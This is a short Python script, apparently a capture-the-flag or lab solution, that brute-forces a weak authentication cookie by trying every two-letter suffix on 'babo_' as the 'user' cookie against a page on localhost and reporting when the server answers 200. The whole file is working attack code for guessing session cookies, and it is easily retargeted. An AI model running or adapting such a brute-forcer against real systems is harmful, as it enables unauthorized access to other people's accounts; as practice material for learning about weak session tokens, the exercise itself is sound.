import requests

def request_checker(url,random_2char):
    user_value = f"babo_{random_2char}"
    cookies = {
        'user': user_value
    }
    response = requests.get(url, cookies=cookies,allow_redirects=False)
    if(response.status_code==200):
        print(f"Cracked!!! : {user_value}")
        return True
    else:
        print(f"failed : {user_value}")

def buster_2char(characters):      
    for c1 in characters:
        for c2 in characters:
                gen = ''.join([c1, c2])
                if(request_checker(url='http://localhost:8000/page_babo.php', random_2char=gen)):
                    return
                        
buster_2char('abcdefghijklmnopqrstuvwxyz')
